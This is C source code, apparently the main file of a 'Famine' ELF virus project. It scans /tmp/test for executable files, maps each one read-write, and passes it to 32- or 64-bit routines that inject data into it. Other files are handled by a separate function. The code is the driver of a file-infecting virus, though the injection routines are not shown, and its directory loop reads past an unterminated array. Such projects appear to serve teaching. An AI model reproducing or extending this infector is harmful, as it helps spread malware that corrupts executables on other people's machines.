#include "famine.h"

int inject_data(unsigned char *file) {
    int archi = file[4];
    if (archi == 1) {
        // printf("exec 32bits\n");
        handle_32(file);
    }
    else if (archi == 2) {
        // printf("exec 64bits\n");
        handle_64(file);
    }
    else {
        printf("File nn gere\n");
        return -1;
    }
    return 0;
}

int open_file(char *name_file) {
    int fd = open(name_file, O_RDWR);
    if (fd == -1){
        perror("");
        return -1;
    }
    unsigned long file_size = lseek(fd, 0, SEEK_END);
    if (file_size <= 0){
        write(2, "File empty\n", 11);
        close(fd);
        return -1;
    }

    unsigned char *file = mmap(NULL, file_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (file == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return -1;
    }

    inject_data(file);
    close(fd);
    return 0;
}

int main() {
    char *name_folder[] = {"/tmp/test"};

    struct dirent *dir;

    int i = 0;
    char **name_file_exec = calloc(MAX_FILES, sizeof(char *));
    int index = 0;

    while (name_folder[i]) {
        if (!strcmp(name_folder[i], "/home/zarbiy/Documents/Famine")) {
            i++;
            continue ;
        }

        DIR *d = opendir(name_folder[i]);
        if (d) {
            while ((dir = readdir(d)) != NULL) {
                if (dir->d_type == DT_REG) {
                    char path[1024] = "\0";
                    struct stat st;

                    snprintf(path, sizeof(path), "%s/%s", name_folder[i], dir->d_name);
                    if (stat(path, &st) == 0) {
                        if (st.st_mode & S_IXUSR) {
                            // printf("Handle file: %s %s\n", dir->d_name, path);
                            if (open_file(path) != -1) {
                                name_file_exec[index] = strdup(path);
                                index += 1;
                            }
                        }
                        else {
                            // printf("Handle file: %s %s\n", dir->d_name, path);
                            if (handle_other_file(path) != -1) {
                                name_file_exec[index] = strdup(path);
                                index += 1;
                            }
                        }
                    }
                }
                else if (dir->d_type == DT_DIR) {
                    if (strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
                        char path[1024] = "\0";
                        snprintf(path, sizeof(path), "%s/%s", name_folder[i], dir->d_name);
                        printf("Path directory: %s\n", path);
                    }
                }
            }
            closedir(d);
            if (index == 99) {
                printf("Limit file reach !\n");
                break;
            }
        }
        i++;
    }
    print_tab(name_file_exec);
    free_tab(name_file_exec, index);
    return 0;
}
